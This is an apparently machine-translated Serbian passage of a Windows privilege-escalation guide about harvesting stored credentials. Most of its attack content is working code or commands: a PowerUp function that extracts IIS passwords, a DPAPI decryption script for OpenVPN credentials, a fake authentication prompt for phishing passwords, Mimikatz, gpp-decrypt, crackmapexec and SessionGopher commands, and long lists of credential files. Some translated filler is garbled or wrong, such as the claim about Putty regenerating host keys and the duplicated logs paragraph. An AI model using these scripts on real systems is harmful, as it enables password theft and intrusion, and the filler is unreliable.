- Koristite sigurnosne alate i softver za otkrivanje i sprečavanje napada na lokalno podizanje privilegija.
- Ažurirajte operativni sistem i sve instalirane aplikacije kako biste ispravili poznate slabosti.
- Konfigurišite Credential Manager tako da koristi jake lozinke i dvofaktornu autentifikaciju.
- Ograničite pristup Credential Manager-u samo privilegovanim korisnicima.
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Koristite **Mimikatz** modul `dpapi::rdg` sa odgovarajućim `/masterkey` da **dekriptujete bilo koji .rdg fajl**.\
Možete **izvući mnogo DPAPI master ključeva** iz memorije pomoću Mimikatz modula `sekurlsa::dpapi`.

### Lepkovi

Ljudi često koriste aplikaciju StickyNotes na Windows radnim stanicama da **sačuvaju lozinke** i druge informacije, ne shvatajući da je to baza podataka. Ovaj fajl se nalazi na putanji `C:\Users\<korisnik>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek je vredno pretražiti ga i pregledati.

### AppCmd.exe

**Napomena: Da biste povratili lozinke iz AppCmd.exe, morate biti Administrator i pokrenuti se sa visokim nivoom integriteta.**\
**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\
Ako ovaj fajl postoji, moguće je da su neki **poverljivi podaci** konfigurisani i mogu se **povratiti**.

Ovaj kod je izvučen iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) alata.
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Proverite da li postoji `C:\Windows\CCM\SCClient.exe`.\
Instalateri se **pokreću sa privilegijama sistema**, mnogi su podložni **DLL Sideloading-u (Informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Fajlovi i registri (Poverljivi podaci)

### Putty Poverljivi podaci
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host ključevi

Putty je popularan SSH i Telnet klijent koji se često koristi za pristupanje udaljenim serverima. Kada se prvi put povežete sa serverom putem Putty-ja, generišu se SSH host ključevi koji se koriste za autentifikaciju servera.

SSH host ključevi se čuvaju na serveru i na lokalnom računaru. Na serveru se čuvaju u datoteci `/etc/ssh/ssh_host_*_key`, dok se na lokalnom računaru čuvaju u Putty-jevom registru.

Kada se povežete sa serverom, Putty proverava da li se host ključevi na serveru podudaraju sa host ključevima u Putty-jevom registru. Ako se ključevi ne podudaraju, Putty će vas upozoriti da postoji mogućnost da se povezujete sa lažnim serverom.

Ako želite da proverite host ključeve koji se čuvaju u Putty-jevom registru, možete otvoriti `regedit` i navigirati do `HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\SshHostKeys`. Tu ćete pronaći listu host ključeva sa informacijama o serverima sa kojima ste se povezali.

Ako primetite da se host ključevi ne podudaraju ili sumnjate da su kompromitovani, možete obrisati odgovarajući ključ iz Putty-jevog registra. Nakon toga, prilikom sledećeg povezivanja sa serverom, Putty će generisati nove host ključeve i upozoriti vas da se ključevi promenili.
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH ključevi u registru

SSH privatni ključevi mogu biti smešteni unutar registarskog ključa `HKCU\Software\OpenSSH\Agent\Keys`, pa bi trebalo da proverite da li ima nečega zanimljivog unutra:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ako pronađete bilo koji unos unutar tog puta, verovatno će biti sačuvani SSH ključ. On je enkriptovan, ali se može lako dekriptovati koristeći [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
Više informacija o ovoj tehnici možete pronaći ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ako `ssh-agent` servis nije pokrenut i želite da se automatski pokrene prilikom pokretanja sistema, pokrenite:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Izgleda da ova tehnika više nije važeća. Pokušao sam da kreiram neke SSH ključeve, dodam ih sa `ssh-add` i prijavim se putem SSH na mašinu. Registry ključ HKCU\Software\OpenSSH\Agent\Keys ne postoji i procmon nije identifikovao upotrebu `dpapi.dll` tokom asimetrične autentifikacije ključem.
{% endhint %}

### Neprisutni fajlovi
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Možete takođe pretraživati ove datoteke koristeći **metasploit**: _post/windows/gather/enum\_unattend_

Primer sadržaja:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM i SYSTEM rezervne kopije

U operativnom sistemu Windows, SAM (Security Account Manager) i SYSTEM fajlovi sadrže važne informacije o korisnicima i sistemskim postavkama. Ovi fajlovi su često cilj napadača jer mogu pružiti mogućnost za eskalaciju privilegija.

Da biste izvršili napad na lokalnu eskalaciju privilegija, prvo morate dobiti pristup SAM i SYSTEM fajlovima. Jedan od načina da to postignete je da napravite rezervne kopije ovih fajlova.

Da biste napravili rezervne kopije SAM i SYSTEM fajlova, možete koristiti alate kao što su `reg save` ili `Volume Shadow Copy Service (VSS)`. Ovi alati omogućavaju da se naprave kopije fajlova dok su oni još uvek dostupni i nisu zaključani od strane operativnog sistema.

Nakon što napravite rezervne kopije SAM i SYSTEM fajlova, možete ih preneti na svoj sistem za dalju analizu i eksploataciju. Ove kopije mogu sadržati osetljive informacije, kao što su hash-ovi lozinki korisnika, koje možete koristiti za napredne tehnike napada na eskalaciju privilegija.

Važno je napomenuti da je pristup SAM i SYSTEM fajlovima obično ograničen samo za privilegovane korisnike, pa je za izvršenje ovog napada potrebno imati odgovarajuće privilegije ili koristiti ranjivosti u sistemu kako biste dobili pristup ovim fajlovima.
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials

Cloud Credentials (Cloud pristupni podaci) su informacije koje se koriste za autentifikaciju i autorizaciju pristupa cloud platformama i uslugama. Ove informacije uključuju korisnička imena, lozinke, API ključeve i sertifikate. Cloud Credentials su od vitalnog značaja za pristup i upravljanje cloud resursima.

Kako bi se obezbedila sigurnost cloud okruženja, važno je pravilno upravljati Cloud Credentials. Evo nekoliko preporuka za sigurno rukovanje ovim podacima:

1. **Koristite jake lozinke**: Kreirajte složene lozinke koje kombinuju velika i mala slova, brojeve i posebne znakove. Izbegavajte korišćenje iste lozinke za više naloga.

2. **Koristite dvofaktornu autentifikaciju**: Omogućite dvofaktornu autentifikaciju za dodatni sloj sigurnosti. Ovo zahteva dodatni korak verifikacije, poput slanja jednokratnog koda na mobilni uređaj.

3. **Redovno menjajte lozinke**: Redovno menjajte lozinke kako biste smanjili rizik od neovlašćenog pristupa. Preporučuje se menjanje lozinki najmanje jednom u nekoliko meseci.

4. **Bezbedno čuvajte Cloud Credentials**: Čuvajte Cloud Credentials na sigurnom mestu, poput šifrovanih datoteka ili upotrebe sigurnih upravitelja lozinki. Izbegavajte deljenje ovih podataka putem e-pošte ili nezaštićenih kanala komunikacije.

5. **Pratite aktivnosti**: Redovno pratite aktivnosti na cloud nalogu kako biste otkrili sumnjive ili neautorizovane aktivnosti. Ako primetite bilo kakve nepravilnosti, odmah preduzmite odgovarajuće mere.

Pravilno upravljanje Cloud Credentials je ključno za održavanje sigurnosti cloud okruženja. Sledenje ovih preporuka pomaže u zaštiti vaših podataka od neovlašćenog pristupa i zloupotrebe.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Pretražite datoteku nazvanu **SiteList.xml**

### Keširana GPP lozinka

Ranije je postojala mogućnost implementacije prilagođenih lokalnih administratorskih naloga na grupi mašina putem Group Policy Preferences (GPP). Međutim, ovaj metod je imao značajne sigurnosne propuste. Prvo, Group Policy Objects (GPO), koji su sačuvani kao XML datoteke u SYSVOL-u, mogli su biti pristupljeni od strane bilo kog korisnika domene. Drugo, lozinke unutar ovih GPP-ova, koje su šifrovane AES256 algoritmom koristeći javno dokumentovanu podrazumevanu ključnu vrednost, mogle su biti dešifrovane od strane bilo kog autentifikovanog korisnika. Ovo je predstavljalo ozbiljan rizik, jer je moglo omogućiti korisnicima da steknu povišene privilegije.

Da bi se umanjio ovaj rizik, razvijena je funkcija koja skenira lokalno keširane GPP datoteke koje sadrže polje "cpassword" koje nije prazno. Kada se pronađe takva datoteka, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat uključuje detalje o GPP-u i lokaciju datoteke, što pomaže u identifikaciji i otklanjanju ove sigurnosne ranjivosti.

Pretražite `C:\ProgramData\Microsoft\Group Policy\history` ili _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_ za ove datoteke:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Da biste dešifrovali cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Korišćenje crackmapexec alata za dobijanje lozinki:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config

IIS Web Config je konfiguracioni fajl koji se koristi za podešavanje i konfigurisanje Internet Information Services (IIS) veb servera. Ovaj fajl sadrži informacije o postavkama i parametrima koji se odnose na veb aplikacije koje se izvršavaju na IIS serveru.

Kroz IIS Web Config fajl, možete kontrolisati različite aspekte veb servera, kao što su sigurnost, autentifikacija, autorizacija, rutiranje, kompresija, sesije i mnoge druge funkcionalnosti. Ovaj fajl se nalazi u korenskom direktorijumu veb aplikacije i može biti napisan u XML formatu.

Kada se radi o hakovanju, IIS Web Config fajl može biti meta napada jer sadrži osetljive informacije o konfiguraciji servera. Napadači mogu pokušati da pristupe ovom fajlu kako bi pronašli slabosti u konfiguraciji i iskoristili ih za eskalaciju privilegija ili izvršavanje drugih zlonamernih aktivnosti.

Da biste zaštitili IIS Web Config fajl od neovlašćenog pristupa, preporučuje se primena odgovarajućih sigurnosnih mera, kao što su:

- Ograničavanje pristupa fajlu samo privilegovanim korisnicima i administratorima.
- Redovno ažuriranje IIS servera i primena sigurnosnih zakrpa.
- Korišćenje snažnih lozinki za pristup fajlu.
- Praćenje i analiza logova kako bi se otkrili eventualni pokušaji neovlašćenog pristupa.

Ukratko, IIS Web Config fajl je ključni element u konfiguraciji IIS veb servera i zahteva adekvatnu zaštitu kako bi se sprečili potencijalni napadi i curenje osetljivih informacija.
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Primer web.config fajla sa pristupnim podacima:

```xml
<configuration>
  <appSettings>
    <add key="DatabaseUsername" value="korisnik" />
    <add key="DatabasePassword" value="lozinka" />
  </appSettings>
</configuration>
```

Ovde je prikazan primer web.config fajla koji sadrži pristupne podatke. U ovom slučaju, korisničko ime za bazu podataka je podešeno na "korisnik", a lozinka na "lozinka".
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN podaci za prijavu

Kada koristite OpenVPN za pristup mreži, morate imati odgovarajuće podatke za prijavu. Ovi podaci uključuju korisničko ime i lozinku. Da biste se uspešno prijavili na OpenVPN, morate uneti ispravne podatke za prijavu koje vam je dodelio administrator sistema.

Uobičajeno, korisničko ime i lozinka za OpenVPN su jedinstveni za svakog korisnika. Ako niste sigurni koji su vaši podaci za prijavu, obratite se administratoru sistema kako biste dobili ispravne informacije.

Kada imate ispravne podatke za prijavu, možete ih koristiti za uspostavljanje sigurne veze sa OpenVPN serverom i pristupanje mreži. Ovi podaci su važni za održavanje sigurnosti i privatnosti prilikom korišćenja OpenVPN-a.
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Dnevnici

Logs are a valuable source of information for hackers during the privilege escalation phase. They can provide insights into system activities, user actions, and potential vulnerabilities. By analyzing logs, hackers can identify weak points and exploit them to escalate their privileges.

Dnevnici su dragocen izvor informacija za hakere tokom faze eskalacije privilegija. Oni mogu pružiti uvid u aktivnosti sistema, korisničke radnje i potencijalne ranjivosti. Analizom dnevnika, hakeri mogu identifikovati slabosti i iskoristiti ih za eskalaciju svojih privilegija.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Zatražite pristupne podatke

Uvek možete **zatražiti od korisnika da unese svoje pristupne podatke ili čak pristupne podatke drugog korisnika** ako smatrate da ih može znati (primetite da je **direktno traženje** pristupnih podataka od klijenta veoma **rizično**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mogući nazivi fajlova koji sadrže akreditive**

Poznati fajlovi koji su nekada sadržali **lozinke** u **čistom tekstu** ili **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Pretražite sve predložene datoteke:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Kredencijali u Recycle Binu

Trebali biste takođe proveriti Bin da biste pronašli kredencijale unutra.

Da **obnovite lozinke** koje su sačuvane od strane nekoliko programa, možete koristiti: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Unutar registra

**Drugi mogući registarski ključevi sa kredencijalima**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Izdvajanje openssh ključeva iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pretraživača

Treba proveriti baze podataka gde su sačuvane lozinke iz **Chrome-a ili Firefox-a**.\
Takođe, proverite istoriju, obeleživače i omiljene stranice pretraživača jer se možda neke **lozinke tamo čuvaju**.

Alati za izdvajanje lozinki iz pretraživača:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Prepisivanje COM DLL fajlova**

**Component Object Model (COM)** je tehnologija koja je ugrađena u Windows operativni sistem i omogućava **komunikaciju** između softverskih komponenti različitih jezika. Svaka COM komponenta je **identifikovana putem klasnog ID-a (CLSID)**, a svaka komponenta izlaže funkcionalnost putem jednog ili više interfejsa, identifikovanih putem interfejsnih ID-ova (IID).

COM klase i interfejsi su definisani u registru pod **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** i **HKEY\_**_**CLASSES\_**_**ROOT\Interface**. Ovaj registar se kreira spajanjem registra **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Unutar CLSID-ova ovog registra možete pronaći podregistrar **InProcServer32** koji sadrži **podrazumevanu vrednost** koja pokazuje na **DLL** i vrednost nazvanu **ThreadingModel** koja može biti **Apartment** (jednonitno), **Free** (višenitno), **Both** (jedno ili više) ili **Neutral** (nitno neutralno).

![](<../../.gitbook/assets/image (638).png>)

U osnovi, ako možete **prepisati bilo koji od DLL fajlova** koji će biti izvršeni, možete **povećati privilegije** ako taj DLL fajl bude izvršen od strane drugog korisnika.

Da biste saznali kako napadači koriste COM preusmeravanje kao mehanizam za trajno prisustvo, pogledajte:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Opšta pretraga lozinki u fajlovima i registru**

**Pretražite sadržaj fajlova**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Pretraživanje datoteke sa određenim nazivom**

Da biste pronašli datoteku sa određenim nazivom, možete koristiti naredbu `dir` ili `findstr` u naredbenom redu. Evo kako to možete uraditi:

```plaintext
dir /s /b C:\*ime_datoteke*
```

Ova naredba će pretražiti sve datoteke na disku C: i prikazati putanju do datoteke sa odgovarajućim nazivom. Ako želite da pretražite samo određeni direktorijum, možete navesti putanju do tog direktorijuma umesto `C:\`.

```plaintext
findstr /s /i /m "ime_datoteke" C:\*
```

Ova naredba će takođe pretražiti sve datoteke na disku C: i prikazati putanju do datoteke sa odgovarajućim nazivom. Opcija `/i` čini pretragu neosetljivom na velika i mala slova, dok opcija `/m` prikazuje samo imena datoteka umesto linija koje sadrže podudaranja.

Napomena: Zamijenite `ime_datoteke` sa stvarnim nazivom datoteke koju tražite.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pretražite registar u potrazi za imenima ključeva i lozinkama**

Da biste pronašli ključeve registra koji sadrže imena ključeva i lozinke, možete koristiti alate kao što su `reg query` ili `regedit`. Ovi alati omogućavaju pretragu registra i pronalaženje odgovarajućih ključeva.

Na primer, možete koristiti sledeću komandu da biste pretražili registar za ključeve koji sadrže određeni niz:

```
reg query HKLM /f "ime_ključa_ili_lozinke" /t REG_SZ /s
```

Ova komanda će pretražiti registar u ključu `HKLM` (HKEY_LOCAL_MACHINE) i pronaći sve ključeve koji sadrže navedeni niz u vrednosti tipa `REG_SZ` (string). Opcija `/s` omogućava pretragu i podključeva.

Takođe možete koristiti `regedit` alat za pretragu registra. Otvorite `regedit` i koristite opciju "Find" (Pronađi) da biste uneli niz koji želite pretražiti. Alat će pretražiti registar i prikazati rezultate koji odgovaraju vašem upitu.

Važno je napomenuti da je pretraga registra osetljiva na velika i mala slova, pa je potrebno uneti tačan niz koji želite pronaći. Takođe, budite oprezni prilikom rukovanja registrom, jer nepravilne izmene mogu dovesti do problema sa sistemom.
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Alati koji traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) je msf dodatak koji sam kreirao kako bi automatski izvršavao svaki metasploit POST modul koji traži akreditive unutar žrtve.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski traži sve datoteke koje sadrže lozinke navedene na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje lozinki sa sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži sesije, korisnička imena i lozinke nekoliko alata koji čuvaju ove podatke u čitljivom obliku (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP).
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Procureni hendleri

Zamislite da **proces koji se izvršava kao SYSTEM otvara novi proces** (`OpenProcess()`) sa **puno pristupa**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali nasleđuje sve otvorene hendlere glavnog procesa**.\
Zatim, ako imate **puni pristup niskoprivilegovanom procesu**, možete dobiti **otvoreni hendler privilegovanog procesa koji je kreiran** sa `OpenProcess()` i **ubaciti shellcode**.\
[Pročitajte ovaj primer za više informacija o **kako otkriti i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte **drugi post za detaljnije objašnjenje o tome kako testirati i iskoristiti više otvorenih hendlera procesa i niti nasleđenih sa različitim nivoima dozvola (ne samo puni pristup)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonacija klijenta imenovane cevi

Deljeni segmenti memorije, nazvani **cevi**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows pruža mogućnost nazvanih cevi (**Named Pipes**), koja omogućava nesrodne procese da dele podatke, čak i preko različitih mreža. Ovo podseća na arhitekturu klijent/server, sa ulogama definisanim kao **imenovani cev server** i **imenovani cev klijent**.

Kada podaci budu poslati kroz cev od strane **klijenta**, **server** koji je postavio cev ima mogućnost da **preuzme identitet** **klijenta**, pod uslovom da ima potrebna **SeImpersonate** prava. Identifikacija privilegovanog procesa koji komunicira putem cevi omogućava vam da imitirate taj proces i steknete više privilegija kada se interakcija sa cevima koje ste uspostavili dogodi. Uputstva za izvršenje takvog napada možete pronaći [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](./#from-high-integrity-to-system).

Takođe, sledeći alat omogućava **presretanje komunikacije imenovane cevi pomoću alata poput burp-a:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava listanje i pregled svih cevi radi pronalaženja privilegija** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Razno

### **Pratite komandne linije za lozinke**

Kada dobijete shell kao korisnik, mogu postojati zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju akreditive putem komandne linije**. Dole navedeni skript beleži komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim stanjem, prikazujući sve razlike.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

